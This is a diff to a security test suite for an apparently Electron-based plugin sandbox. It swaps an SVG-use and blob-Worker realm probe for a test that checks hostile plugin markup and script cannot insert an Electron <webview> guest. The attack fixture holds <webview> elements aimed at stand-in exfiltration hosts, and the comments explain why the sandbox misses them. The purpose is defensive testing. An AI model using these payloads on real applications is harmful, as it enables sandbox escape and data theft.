@@ -608,58 +608,52 @@ const DOMPARSER_SHADOW_ATTACK_HTML = `<!doctype html>
 </html>`;
 
 /**
- * Round 11 probes: two realms the frame sweep never looks at.
+ * Round 11. `SELECTOR` in `KILL_CHILD_REALMS` and the markup sanitiser in
+ * `INSERT_PLUGIN_HTML` both enumerate the elements that can become a browsing
+ * context as `iframe,frame,object,embed,link`. On the Electron desktop build
+ * that list is short by one: `<webview>`.
  *
- * `<use>` instantiates a *closed, UA-owned* shadow tree — `use.shadowRoot` is
- * null and `querySelectorAll` cannot reach into it — and `foreignObject` is an
- * HTML integration point, so an `<iframe>` cloned into that tree would be a
- * browsing context nothing here can find.
+ * The main window is created with `webviewTag: true`
+ * (`packages/desktop/src/main.ts:714`), which registers the `<webview>` custom
+ * element in the renderer. A `<webview>` guest is a separate `WebContents` with
+ * its own session — the parent document's CSP never applies to it, `frame-src`
+ * and `object-src` do not describe it, and the iframe `sandbox` flags are not
+ * inherited by it. It is exactly the fresh realm the whole shell exists to deny,
+ * with a network stack attached.
  *
- * A `blob:` `Worker` is a fresh realm too. It has no `RTCPeerConnection`, but it
- * does have `fetch` and `WebSocket`, and the shell never touches it.
+ * The one gate is `will-attach-webview`
+ * (`packages/desktop/src/main.ts:748`), and it is not a destination gate:
+ * `isPaseoBrowserWebviewAttach` (`features/browser-webviews/index.ts:43`)
+ * accepts any `http:`/`https:` URL and only requires
+ * `partition="persist:paseo-browser"`, a constant a plugin author reads out of
+ * the published source.
+ *
+ * A browser test cannot attach a guest — in plain Chromium `<webview>` is an
+ * unknown element and makes no request — so what this asserts is the half that
+ * lives in `bridge.ts`: the element must not survive to the live document, from
+ * markup or from script. It does today, `src` and `partition` intact.
  */
-const REALM_PROBE_ATTACK_HTML = `<!doctype html>
+const WEBVIEW_ATTACK_HTML = `<!doctype html>
 <html>
   <body>
+    <webview partition="persist:paseo-browser" src="https://markup.leak.example.test/?d=__exfil__"></webview>
     <script>
-      var CHILD = "&lt;script&gt;parent.parent.postMessage({exfil:1,type:'child'," +
-        "tag:'TAG',rtc:typeof RTCPeerConnection},'*');&lt;/script&gt;";
-      var notes = [];
-
       window.addEventListener("message", function (event) {
         if (!event.data || event.data.exfil !== 1 || event.data.type !== "attack") return;
-        var url = event.data.imageUrl;
 
         try {
-          var svg = document.createElementNS("http://www.w3.org/2000/svg", "svg");
-          svg.innerHTML =
-            "<g id='usesrc'><foreignObject width='50' height='50'><iframe srcdoc=\\"" +
-            CHILD.replace("TAG", "svg-use") + "\\"></iframe></foreignObject></g>" +
-            "<use href='#usesrc'></use>";
-          document.body.appendChild(svg);
-          notes.push("use:inserted");
-        } catch (error) {
-          notes.push("use:threw:" + (error && error.message));
-        }
-
-        try {
-          var source =
-            "self.postMessage('rtc=' + (typeof RTCPeerConnection));" +
-            "fetch(" + JSON.stringify(url) + ").then(" +
-            "function(){self.postMessage('fetch=sent')}," +
-            "function(){self.postMessage('fetch=blocked')});";
-          var blob = new Blob([source], { type: "text/javascript" });
-          var worker = new Worker(URL.createObjectURL(blob));
-          worker.onmessage = function (message) { notes.push("worker:" + message.data); };
-          worker.onerror = function () { notes.push("worker:error"); };
-          notes.push("worker:constructed");
-        } catch (error) {
-          notes.push("worker:threw:" + (error && error.message));
-        }
+          var guest = document.createElement("webview");
+          guest.setAttribute("partition", "persist:paseo-browser");
+          guest.setAttribute("src", "https://script.leak.example.test/?d=__exfil__");
+          document.body.appendChild(guest);
+        } catch (error) {}
 
         setTimeout(function () {
-          window.parent.postMessage({ exfil: 1, type: "swept", note: notes.join(" ") }, "*");
-        }, 900);
+          var found = [];
+          var all = document.querySelectorAll("webview");
+          for (var i = 0; i < all.length; i++) found.push(all[i].getAttribute("src"));
+          window.parent.postMessage({ exfil: 1, type: "webviews", found: found }, "*");
+        }, 300);
       });
       window.parent.postMessage({ exfil: 1, type: "ready" }, "*");
     </script>
@@ -1089,45 +1083,34 @@ describe("a hostile plugin", () => {
     );
   });
 
-  it("cannot get a realm from an SVG use tree or a blob Worker", async () => {
-    const childReports: string[] = [];
-    let swept: string | null = null;
+  it("cannot get an Electron webview guest into the document", async () => {
+    let found: string[] | null = null;
     const onMessage = (event: MessageEvent) => {
-      const data = event.data as {
-        exfil?: number;
-        type?: string;
-        tag?: string;
-        rtc?: string;
-        note?: string;
-      };
+      const data = event.data as { exfil?: number; type?: string; found?: string[] };
       if (data?.exfil !== 1) {
         return;
       }
-      if (data.type === "child") {
-        childReports.push(`${data.tag}=${data.rtc}`);
-      }
-      if (data.type === "swept") {
-        swept = data.note ?? "";
+      if (data.type === "webviews") {
+        found = data.found ?? [];
       }
       if (data.type === "ready") {
-        (event.source as Window | null)?.postMessage(
-          { exfil: 1, type: "attack", imageUrl: `${location.origin}/pwa-icon-192.png` },
-          "*",
-        );
+        (event.source as Window | null)?.postMessage({ exfil: 1, type: "attack" }, "*");
       }
     };
     window.addEventListener("message", onMessage);
 
-    const iframe = createPluginIframe(REALM_PROBE_ATTACK_HTML);
+    const iframe = createPluginIframe(WEBVIEW_ATTACK_HTML);
     document.body.appendChild(iframe);
     cleanups.push(() => {
       window.removeEventListener("message", onMessage);
       iframe.remove();
     });
 
-    const note = await waitFor(() => swept, "the realm probe to finish");
-
-    expect(`${childReports.join(" ")} | ${note}`).toBe("PROBE");
+    // Both orderings: `<webview>` written into the plugin's markup, which the
+    // detached sanitiser should drop, and one appended by a plugin script, which
+    // the sweep should drop. On the desktop build each of these is a guest
+    // WebContents on an attacker-chosen origin with no CSP over it.
+    expect(await waitFor(() => found, "the webview attack to finish")).toEqual([]);
   });
 
   it("cannot leak a hostname through a resource hint in its markup", async () => {
